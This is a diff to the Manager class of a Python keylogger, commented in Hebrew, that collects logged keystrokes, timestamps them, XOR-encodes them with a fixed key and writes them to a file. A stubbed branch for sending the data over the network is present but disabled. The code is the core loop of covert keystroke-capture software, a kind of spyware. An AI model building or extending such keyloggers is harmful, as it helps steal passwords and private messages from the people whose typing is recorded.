@@ -10,7 +10,7 @@ class Manager:
         self.time = time
         self.keylogger = KeyLogger()
         self.file_writer = FileWriter()
-        self.encryption = Encryption
+        self.encryption = Encryption(5)
         self.running = False
 
     def collect_keys(self):
@@ -21,17 +21,19 @@ class Manager:
                 if logged_keys:
                     timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                     data = {timestamp: logged_keys}
+
                     # הצפנה
-                    encrypted_data = self.encryption(data)
+                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(data)
+
                     # שליחה לקובץ
                     self.file_writer.Writes_to_file(encrypted_data)
-                    # שליחה לרשת
-                    if self.file_writer.Writes_to_network:
-                        # self.network_writer.send(encrypted_data)
-                        pass
 
-                    # ניקוי
-                    self.buffer.clear()
+                    #  שליחה לרשת (אם מופעל)
+                    if self.file_writer.Writes_to_network:
+                        pass  # self.network_writer.send(encrypted_data)
+
+                    #  ניקוי ה-buffer
+                    self.keylogger.clear_buffer()  # שים לב שזה כנראה צריך להיות בתוך KeyLogger
             except Exception as e:
                 print(f"Error collecting keystrokes: {e}")
 
